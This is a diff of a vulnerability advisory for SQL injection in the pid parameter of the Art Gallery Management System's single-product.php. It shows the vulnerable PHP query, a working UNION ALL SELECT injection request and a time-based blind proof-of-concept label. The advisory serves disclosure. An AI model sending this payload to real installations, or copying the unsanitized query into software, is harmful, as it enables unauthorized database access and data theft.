@@ -16,6 +16,37 @@ published: true
 
 ----
 
+
+
+### Vulnerability Details
+
+- **Application Name:** Art Gallery Management System 
+- **Vendor Homepage:** [Vendor Homepage](https://phpgurukul.com/)
+- **Software Link:** [Vendor Homepage](https://phpgurukul.com/art-gallery-management-system-using-php-and-mysql/)
+- The vulnerability lies in the following code snippet:
+
+`Art-Gallery-MS-PHP/agms/single-product.php/single-product.php`
+
+```php
+<?php
+...
+
+$pid=$_GET['pid'];
+
+$ret=mysqli_query($con,"select tblarttype.ID as atid,tblarttype.ArtType as typename,tblartmedium.ID
+as amid,tblartmedium.ArtMedium as amname,tblartproduct.ID as apid,tblartist.Name,tblartproduct.Title,
+tblartproduct.Dimension,tblartproduct.Orientation,tblartproduct.Size,tblartproduct.Artist,
+tblartproduct.ArtType,tblartproduct.ArtMedium,tblartproduct.SellingPricing,tblartproduct.Description,
+tblartproduct.Image,tblartproduct.Image1,tblartproduct.Image2,tblartproduct.Image3,tblartproduct.Image4,
+tblartproduct.RefNum,tblartproduct.ArtType from tblartproduct join tblarttype on tblarttype.ID=tblartproduct.ArtType 
+join tblartmedium on tblartmedium.ID=tblartproduct.ArtMedium join tblartist on tblartist.ID=tblartproduct.Artist where tblartproduct.ID='$pid'");
+
+...
+
+?>
+```
+In this code, SQL injection occurs because the user input is directly concatenated into the SQL query without proper sanitization or validation. The $_GET['pid'] user input is included directly in the query without being checked or cleaned, allowing attackers to inject malicious SQL code and potentially manipulate the database or access sensitive information. 
+
 ### Vulnerability Description:
 
 The vulnerability exists in the `single-product.php` file of AGMS,
@@ -42,7 +73,7 @@ GET /Art-Gallery-MS-PHP/agms/single-product.php?pid=1'+UNION+ALL+SELECT+NULL,NUL
 CONCAT(0x71716b7671,0x4e54625a41616c594e416443545a424f765177596b4d436155664a6766446e5154665748514f437a,0x716a7a7671),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--+- HTTP/1.1
 ```
 
-- Poc Foto
+- Poc Foto **(Time Based Blind SQL Injection)**
 
 ![This is an alt text.](/assets/zday/raJ8Cp9.png "poc foto")
 
@@ -71,20 +102,3 @@ Parameter: pid (GET)
 This vulnerability enables malicious actors to execute various harmful actions,
 including session hijacking, data exfiltration, and tampering with database structures.
 
-
-
-### Vulnerable code section:
-====================================================
-
-`Art-Gallery-MS-PHP/agms/single-product.php/single-product.php`
-```
-$pid=$_GET['pid'];
-
-$ret=mysqli_query($con,"select tblarttype.ID as atid,tblarttype.ArtType as typename,tblartmedium.ID
-as amid,tblartmedium.ArtMedium as amname,tblartproduct.ID as apid,tblartist.Name,tblartproduct.Title,
-tblartproduct.Dimension,tblartproduct.Orientation,tblartproduct.Size,tblartproduct.Artist,
-tblartproduct.ArtType,tblartproduct.ArtMedium,tblartproduct.SellingPricing,tblartproduct.Description,
-tblartproduct.Image,tblartproduct.Image1,tblartproduct.Image2,tblartproduct.Image3,tblartproduct.Image4,
-tblartproduct.RefNum,tblartproduct.ArtType from tblartproduct join tblarttype on tblarttype.ID=tblartproduct.ArtType 
-join tblartmedium on tblartmedium.ID=tblartproduct.ArtMedium join tblartist on tblartist.ID=tblartproduct.Artist where tblartproduct.ID='$pid'");
-```
